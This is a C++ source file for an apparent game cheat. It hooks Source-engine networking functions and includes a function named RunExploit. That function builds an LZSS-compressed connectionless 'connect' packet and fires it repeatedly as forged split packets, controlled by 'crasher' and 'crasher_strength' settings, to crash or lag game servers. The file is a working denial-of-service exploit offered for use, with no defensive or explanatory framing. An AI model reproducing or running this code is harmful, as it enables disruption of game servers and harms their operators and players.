#include "pch.h"
#include "Hooks.h"

#define CONNECTIONLESS_HEADER 0xFFFFFFFF // all OOB packet start with this sequence
#define C2S_CONNECT 'k' // client requests to connect
#define NET_HEADER_FLAG_SPLITPACKET				-2

#define MAX_ROUTABLE_PAYLOAD		1260
#define MIN_USER_MAXROUTABLE_SIZE	576  // ( X.25 Networks )
#define MAX_USER_MAXROUTABLE_SIZE	MAX_ROUTABLE_PAYLOAD
#define NET_MAX_MESSAGE 523956

#define MAX_SPLIT_SIZE	(MAX_USER_MAXROUTABLE_SIZE - sizeof( SPLITPACKET ))
#define MIN_SPLIT_SIZE	(MIN_USER_MAXROUTABLE_SIZE - sizeof( SPLITPACKET ))

#define MAX_SPLITPACKET_SPLITS ( NET_MAX_MESSAGE / MIN_SPLIT_SIZE )

bool shouldCall = true;
int counter = 0;
void* netchann;
char* packetbuf = 0;

int __fastcall CUSTOM_NET_SendLong(void* Calls_SendToImpl, void* netchan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize) {

	short nSplitSizeMinusHeader = nMaxRoutableSize - sizeof(SPLITPACKET);

	int nSequenceNumber = -1;

	char packet[MAX_ROUTABLE_PAYLOAD];
	SPLITPACKET* pPacket = (SPLITPACKET*)packet;

	pPacket->netID = LittleLong(NET_HEADER_FLAG_SPLITPACKET);
	pPacket->nSplitSize = LittleShort(576);
	if (nSplitSizeMinusHeader < 576)
		pPacket->nSplitSize = LittleShort(576);

	unsigned int nPacketCount = (sendlen + nSplitSizeMinusHeader - 1) / nSplitSizeMinusHeader;

	if (nPacketCount > MAX_SPLITPACKET_SPLITS)
		nPacketCount = MAX_SPLITPACKET_SPLITS;

	nPacketCount = CLAMP(nPacketCount, 1u, 127u);

	int nBytesLeft = sendlen;
	int nPacketNumber = 0;
	int nTotalBytesSent = 0;
	int nFragmentsSent = 0;
	pPacket->packetID = -1;
	nSequenceNumber = ++(((DWORD*)netchan)[4196]);
	pPacket->sequenceNumber = LittleLong(nSequenceNumber);

	while (nBytesLeft > 0) {
		int size = min(nSplitSizeMinusHeader, nBytesLeft);

		if (nPacketNumber >= MAX_SPLITPACKET_SPLITS)
			return nTotalBytesSent;

		pPacket->packetID = LittleShort((short)((nPacketNumber << 8) + nPacketCount));

		memcpy(packet + sizeof(SPLITPACKET), (void*)((uintptr_t)sendbuf + (nPacketNumber * nSplitSizeMinusHeader)), size);

		int ret2 = 0;
		int To = -2;
		int* toAddr = &To;
		int ASMSIZE = size + 12;
		void* callSentToPtr = (void*)Calls_SendToImpl;

		__asm {
			mov     eax, ASMSIZE
			push    0FFFFFFFFh
			push    eax
			lea     edx, packet
			mov		ecx, netchan
			call callSentToPtr
			add esp, 8
			mov ret2, eax
		}

		++nFragmentsSent;
		if (ret2 < 0)
			return ret2;

		if (ret2 >= size)
			nTotalBytesSent += size;

		nBytesLeft -= size;
		++nPacketNumber;

		if (nPacketNumber > 128)
			return nTotalBytesSent + nBytesLeft;
	}

	return nTotalBytesSent;
}

unsigned int __stdcall RunExploit(void*) {
	shouldCall = false;
	if (!packetbuf) {
		const int size = (MAX_ROUTABLE_PAYLOAD * 10);
		static LZSSLagger2 g_LZSSLagCreator2(size);
		char* Packet;
		int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
		bytes = CLAMP(bytes, 0, size);

		bf_write msg(Packet, size);
		msg.WriteLong(LittleLong((int)CONNECTIONLESS_HEADER));
		msg.WriteByte(C2S_CONNECT);
		msg.WriteLong(M::HOST_VERSION);

		packetbuf = (char*)malloc(size + sizeof(SPLITPACKET));
		if (!packetbuf)
			return 0;
		memcpy(packetbuf + sizeof(SPLITPACKET), (void*)((uintptr_t)Packet), size);
	}

	for (int i = 0; (i < Cfg::c.misc.crasher_strength) && Cfg::c.misc.crasher; i++) {
		CUSTOM_NET_SendLong((void*)M::Calls_SendToImpl, netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
	}
	shouldCall = true;
	return 0;
}

f_NET_SendLong H::oNET_SendLong;

int __fastcall H::Hooked_NET_SendLong(void* netchannel, DWORD* socket, int nBytesLeft, int nMaxRoutableSize) {

	netchann = netchannel;

	if (Cfg::c.misc.crasher) {
		if (counter >= 2) {
			if (shouldCall) {
				_beginthreadex(0, 0, RunExploit, 0, NULL, 0);
			}
			counter = 0;
		}
		counter++;
	}

	return CUSTOM_NET_SendLong((void*)M::Calls_SendToImpl, netchannel, (unsigned char*)socket, nBytesLeft, 576);
}

f_ProcessConnectionless H::oProcessConnectionless;

bool __fastcall H::Hooked_ProcessConnectionless(void* thisPtr, void* edx, netpacket_t* pPacket) {

	if (Cfg::c.misc.crasher)
		return true;

	return oProcessConnectionless(thisPtr, pPacket);
}

f_CNET_SendSubChannelData H::oCNET_SendSubChannelData;

bool __fastcall H::Hooked_CNET_SendSubChannelData(void* thisPtr, void* edx, void* bufIn) {

	if (Cfg::c.misc.crasher_fix) {
		//TODO: add struct for this??
		*(float*)((uintptr_t)thisPtr + (uintptr_t)16732) = -1;
		I::ClientState->paused = false;
	}

	return oCNET_SendSubChannelData(thisPtr, bufIn);
}
